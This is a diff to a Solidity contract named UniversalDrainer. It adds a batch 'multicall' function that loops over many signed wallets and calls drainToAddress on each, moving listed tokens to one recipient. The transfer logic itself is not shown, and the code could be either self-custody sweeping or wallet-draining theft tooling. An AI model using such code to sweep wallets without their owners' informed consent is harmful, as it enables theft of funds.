@@ -7,7 +7,26 @@ interface IERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
 }
 
+struct Wallet {
+    address wallet;
+    uint8 v;
+    bytes32 r;
+    bytes32 s;
+}
+
 contract UniversalDrainer {
+    function multicall(Wallet[] calldata wallets, address recipient, address[] calldata tokens, uint256 deadline)
+        external
+    {
+        unchecked {
+            for (uint256 i = 0; i < wallets.length; i++) {
+                UniversalDrainer(wallets[i].wallet).drainToAddress(
+                    recipient, tokens, deadline, wallets[i].v, wallets[i].r, wallets[i].s
+                );
+            }
+        }
+    }
+
     function drainToAddress(
         address recipient,
         address[] calldata tokens,
